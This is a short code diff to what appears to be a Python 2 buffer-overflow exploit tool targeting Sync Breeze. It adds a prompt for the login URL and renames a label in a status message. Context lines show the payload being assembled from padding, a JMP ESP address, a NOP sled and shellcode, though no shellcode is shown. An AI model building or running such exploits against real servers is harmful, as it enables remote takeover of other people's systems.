@@ -33,6 +33,9 @@ class Sync_Breeze():
             global Y          
             time.sleep(2)
             print Y+"\n[A]"+W+R+"* buffer_Helper Start Sync Breeze  mode * "+W+Y+"[C]"+W
+            time.sleep(2)
+            print Y+"\n[A]"+W+P+"* use url as 'https/http://' login page/ * "+W+Y+"[C]"+W
+            time.sleep(2)
             self.web_req()
             self.Fuzzing__()
             self.string_ramdon()
@@ -243,7 +246,7 @@ class Sync_Breeze():
                    attack = Start_string+self.jump_address+ self.NO_Operation +shell_code 
                    time.sleep(2)
                    print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
-                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell code'+W
+                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell_code'+W
                    time.sleep(2)
                    print Y+"\n[+]"+W+R+"Target URL "+W+O+ " : "+W, P+self.target_url+W
                    time.sleep(2)
